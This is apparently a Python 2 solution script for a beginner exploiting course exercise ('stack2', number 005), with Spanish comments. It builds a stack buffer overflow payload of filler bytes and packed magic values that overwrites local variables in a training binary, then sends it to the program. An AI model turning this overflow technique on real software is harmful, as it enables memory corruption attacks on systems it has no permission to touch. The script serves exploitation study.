#Solucion the Stack2 ejercicio 005 by hdbreaker
#http://ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/005%20stack2.idb/Enunciado.txt
import os
import struct

stdin, stdout = os.popen4("stack2.exe") 
print stdin

#Buffer 68 Bytes de basura
buff = '\x90' * 68
#primer if not 71727374
var_14 = struct.pack('<I', 0x71727374) # 4 Bytes qrst little endian
var_10 = "\x90" * 4 # => basura para pisar el buffer de var_10 (4 bytes)
#segundo if not 91929394
var_C  = struct.pack('<I', 0x91929394)

payload = buff + var_14 + var_10 + var_C + "\n"
print "[#] Sending Payload"
stdin.write(payload)
print stdout.read(1024)
